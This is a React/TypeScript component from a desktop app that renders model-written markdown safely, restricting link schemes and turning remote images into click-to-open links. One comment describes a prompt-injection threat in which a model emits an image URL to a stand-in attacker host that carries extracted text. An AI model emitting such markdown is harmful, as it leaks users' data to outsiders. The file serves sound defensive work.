import { createContext, memo, useContext, useMemo, type ReactNode } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { openUrl } from "@tauri-apps/plugin-opener";
import type { AnchorHTMLAttributes, ImgHTMLAttributes } from "react";
import { useStreamingReveal } from "../hooks/useStreamingReveal";
import { remarkPageRefs, PAGE_REF_SCHEME } from "../lib/remark-page-refs";

/** Handler that jumps the preview to a page when a page citation is clicked. */
export const PageRefContext = createContext<((page: number) => void) | null>(null);

function PageRefLink({ page, children }: { page: number; children: ReactNode }) {
  const onJump = useContext(PageRefContext);
  if (!onJump || !Number.isFinite(page)) return <>{children}</>;
  return (
    <button type="button" className="page-ref-link" onClick={() => onJump(page)}>
      {children}
    </button>
  );
}

interface MarkdownProps {
  children: string;
  /** When true, completed paragraphs are parsed once; the tail re-parses on each update. */
  live?: boolean;
}

const SAFE_LINK_SCHEMES = ["http:", "https:", "mailto:"];
// http(s) is deliberately absent: model-authored markdown must never auto-fetch
// a remote URL. A prompt-injected document could make the model emit
// ![x](https://attacker/?d=<extracted text>) and exfiltrate on render.
const SAFE_IMG_SCHEMES = ["asset:", "data:"];

const remarkPlugins = [remarkGfm, remarkPageRefs];
const markdownComponents = {
  a: SafeAnchor,
  img: SafeImg,
};

function schemeOf(url: string): string | null {
  try {
    return new URL(url, "app://local").protocol;
  } catch {
    return null;
  }
}

function SafeAnchor({
  href,
  children,
  node: _node,
  ...rest
}: AnchorHTMLAttributes<HTMLAnchorElement> & { node?: unknown }) {
  const target = typeof href === "string" ? href : "";
  if (target.startsWith(PAGE_REF_SCHEME)) {
    const page = parseInt(target.slice(PAGE_REF_SCHEME.length), 10);
    return <PageRefLink page={page}>{children}</PageRefLink>;
  }
  const scheme = schemeOf(target);
  const allowed = !!scheme && SAFE_LINK_SCHEMES.includes(scheme);

  if (!allowed) {
    return <span {...rest}>{children}</span>;
  }

  return (
    <a
      {...rest}
      href={target}
      onClick={(e) => {
        e.preventDefault();
        void openUrl(target);
      }}
    >
      {children}
    </a>
  );
}

function SafeImg({
  src,
  alt,
  node: _node,
  ...rest
}: ImgHTMLAttributes<HTMLImageElement> & { node?: unknown }) {
  const target = typeof src === "string" ? src : "";
  const scheme = schemeOf(target);
  // Remote images render as a click-to-open link instead of auto-fetching
  // (fetching would leak whatever the URL encodes without any user action).
  if (scheme === "https:" || scheme === "http:") {
    return (
      <a
        href={target}
        onClick={(e) => {
          e.preventDefault();
          void openUrl(target);
        }}
      >
        {alt?.trim() || target}
      </a>
    );
  }
  if (!scheme || !SAFE_IMG_SCHEMES.includes(scheme)) return null;
  return <img {...rest} alt={alt} src={target} referrerPolicy="no-referrer" loading="lazy" />;
}

/**
 * Split at the last completed paragraph outside fenced code blocks so streaming
 * only re-parses the tail.
 */
export function splitStreamingMarkdown(text: string): { stable: string; tail: string } {
  let inFence = false;
  let lastSafeSplit = -1;
  let offset = 0;

  const lines = text.split("\n");
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i]!;
    const trimmed = line.trimStart();
    if (trimmed.startsWith("```")) {
      inFence = !inFence;
    }

    offset += line.length;
    if (i < lines.length - 1) {
      if (!inFence && line === "" && i > 0 && lines[i - 1] !== "") {
        lastSafeSplit = offset;
      }
      offset += 1;
    }
  }

  if (lastSafeSplit === -1) return { stable: "", tail: text };
  return {
    stable: text.slice(0, lastSafeSplit).replace(/\n+$/, ""),
    tail: text.slice(lastSafeSplit).replace(/^\n+/, ""),
  };
}

const ParsedMarkdown = memo(function ParsedMarkdown({ text }: { text: string }) {
  if (!text) return null;
  return (
    <ReactMarkdown remarkPlugins={remarkPlugins} components={markdownComponents}>
      {text}
    </ReactMarkdown>
  );
});

// The streaming tail re-parses on every chunk. Unwrap the paragraph wrapper so
// inline markup (bold, italic, code, links) renders live and stays inline next
// to the blinking caret — otherwise raw `**`/`_`/`` ` `` characters flicker in
// the tail until the paragraph closes and moves into the stable block above.
const tailComponents = {
  ...markdownComponents,
  p: ({ children }: { children?: ReactNode }) => <>{children}</>,
};

const ParsedTail = memo(function ParsedTail({ text }: { text: string }) {
  if (!text) return null;
  return (
    <ReactMarkdown remarkPlugins={remarkPlugins} components={tailComponents}>
      {text}
    </ReactMarkdown>
  );
});

function MarkdownInner({ children, live = false }: MarkdownProps) {
  const revealed = useStreamingReveal(children, live);
  const { stable, tail } = useMemo(
    () => (live ? splitStreamingMarkdown(revealed) : { stable: "", tail: revealed }),
    [revealed, live],
  );

  if (!live) {
    return (
      <div className="markdown">
        <ParsedMarkdown text={children} />
      </div>
    );
  }

  return (
    <div className="markdown markdown-streaming">
      {stable ? <ParsedMarkdown text={stable} /> : null}
      {tail ? (
        <span className="markdown-stream-tail">
          <ParsedTail text={tail} />
          <span className="markdown-stream-caret" aria-hidden />
        </span>
      ) : null}
    </div>
  );
}

export const Markdown = memo(MarkdownInner, (prev, next) => {
  if (prev.live !== next.live) return false;
  return prev.children === next.children;
});
